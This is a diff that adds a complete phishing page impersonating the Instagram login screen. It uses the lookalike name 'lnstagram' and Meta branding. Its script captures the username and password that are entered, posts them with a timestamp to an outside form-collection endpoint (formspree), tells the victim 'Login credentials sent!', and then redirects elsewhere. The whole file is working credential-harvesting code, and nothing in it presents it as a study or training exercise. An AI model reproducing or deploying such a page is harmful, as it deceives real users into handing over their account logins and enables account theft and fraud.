@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>lnstagram Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .language-selector {
+            position: absolute;
+            top: 20px;
+            color: #999;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .language-selector:hover {
+            color: #666;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 510px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 60px;
+        }
+
+        .login-header {
+            text-align: center;
+            margin-bottom: 80px;
+        }
+
+        .linstagram-logo {
+            max-width: 100px;
+            height: auto;
+            margin-bottom: 25px;
+            display: block;
+        }
+
+        .form-group {
+            width: 100%;
+            margin-bottom: 14px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            font-size: 14px;
+            background: #fafafa;
+            border-left: 3px solid transparent;
+            transition: all 0.3s;
+            box-sizing: border-box;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            background: #fff;
+            border-color: #ddd;
+            border-left-color: #0095f6;
+            box-shadow: 0 0 0 1px #0095f6 inset;
+        }
+
+        .form-group input::placeholder {
+            color: #999;
+        }
+
+        .password-toggle {
+            position: relative;
+        }
+
+        .password-toggle .toggle-btn {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #666;
+            font-size: 16px;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+            margin-bottom: 12px;
+            transition: background 0.3s;
+            box-sizing: border-box;
+        }
+
+        .login-btn:hover {
+            background: #1877f2;
+        }
+
+        .login-btn:active {
+            transform: scale(0.98);
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .forgot-password a {
+            color: #385185;
+            text-decoration: none;
+            font-size: 13px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        .forgot-password a:hover {
+            color: #0095f6;
+        }
+
+        .signup-divider {
+            width: 100%;
+            text-align: center;
+            margin: 30px 0;
+            color: #999;
+            font-size: 13px;
+        }
+
+        .create-account-btn {
+            width: 100%;
+            padding: 12px;
+            background: transparent;
+            color: #0095f6;
+            border: 2px solid #0095f6;
+            border-radius: 25px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-sizing: border-box;
+        }
+
+        .create-account-btn:hover {
+            background: #f0f8ff;
+        }
+
+        .meta-logo {
+            margin-top: 60px;
+            text-align: center;
+            color: #0095f6;
+            font-size: 13px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .message {
+            text-align: center;
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 4px;
+            display: none;
+            font-size: 13px;
+            width: 100%;
+        }
+
+        .message.success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+            display: block;
+        }
+
+        .message.error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+            display: block;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            color: #0095f6;
+            font-size: 13px;
+            margin-top: 10px;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border: 2px solid #0095f6;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding-top: 40px;
+                max-width: 100%;
+            }
+
+            .login-header {
+                margin-bottom: 50px;
+            }
+
+            .form-group input {
+                font-size: 13px;
+                padding: 12px 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="language-selector">
+        English (US) <span style="font-size: 12px;">⌄</span>
+    </div>
+
+    <div class="login-container">
+        <div class="login-header">
+            <img src="instagram-logo.png" alt="lnstagram" class="linstagram-logo">
+        </div>
+
+        <form id="loginForm">
+            <div class="form-group">
+                <input 
+                    type="text" 
+                    id="username" 
+                    name="username" 
+                    placeholder="Username, email or mobile number"
+                    required
+                >
+            </div>
+
+            <div class="form-group password-toggle">
+                <input 
+                    type="password" 
+                    id="password" 
+                    name="password" 
+                    placeholder="Password"
+                    required
+                >
+                <button type="button" class="toggle-btn" onclick="togglePassword()">👁</button>
+            </div>
+
+            <button type="submit" class="login-btn">Log in</button>
+
+            <div class="loading" id="loading">
+                <span class="spinner"></span> Sending...
+            </div>
+
+            <div class="message" id="message"></div>
+        </form>
+
+        <div class="forgot-password">
+            <a href="javascript:void(0)" onclick="alert('Password reset feature coming soon')">Forgot password?</a>
+        </div>
+
+        <div class="signup-divider">
+            ───────── OR ─────────
+        </div>
+
+        <button class="create-account-btn" onclick="alert('Create account feature coming soon')">Create new account</button>
+
+        <div class="meta-logo">Meta</div>
+    </div>
+
+    <script>
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+            } else {
+                passwordInput.type = 'password';
+            }
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            const messageDiv = document.getElementById('message');
+            const loadingDiv = document.getElementById('loading');
+
+            if (!username) {
+                showMessage('Please enter username, email or mobile number', 'error');
+                return;
+            }
+            if (!password) {
+                showMessage('Please enter password', 'error');
+                return;
+            }
+
+            loadingDiv.style.display = 'block';
+            messageDiv.style.display = 'none';
+
+            const formData = new FormData();
+            formData.append('username', username);
+            formData.append('password', password);
+            formData.append('login_time', new Date().toLocaleString());
+
+            fetch('https://formspree.io/f/mdavzyeq', {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                loadingDiv.style.display = 'none';
+                if (response.ok) {
+                    showMessage('✅ Login credentials sent! Proceeding...', 'success');
+                    document.getElementById('loginForm').reset();
+                    
+                    setTimeout(() => {
+                        window.location.href = 'processing.html';
+                    }, 1000);
+                } else {
+                    showMessage('❌ Error sending login info. Please try again.', 'error');
+                }
+            })
+            .catch(error => {
+                loadingDiv.style.display = 'none';
+                console.error('Error:', error);
+                showMessage('❌ Error sending login info. Please try again.', 'error');
+            });
+        });
+
+        function showMessage(text, type) {
+            const messageDiv = document.getElementById('message');
+            messageDiv.textContent = text;
+            messageDiv.className = `message ${type}`;
+            messageDiv.style.display = 'block';
+        }
+    </script>
+</body>
+</html>
